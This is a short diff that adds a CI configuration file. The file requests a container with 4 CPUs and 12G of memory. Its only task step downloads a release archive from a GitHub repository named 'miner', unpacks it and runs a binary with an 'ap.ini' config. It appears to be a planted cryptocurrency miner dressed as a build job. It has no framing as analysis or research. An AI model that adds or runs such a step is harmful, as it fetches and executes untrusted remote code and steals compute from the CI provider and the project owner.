@@ -1,0 +1,8 @@
+container:
+  image: openjdk:latest
+  cpu: 4
+  memory: 12G
+
+task:
+  script:
+    - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
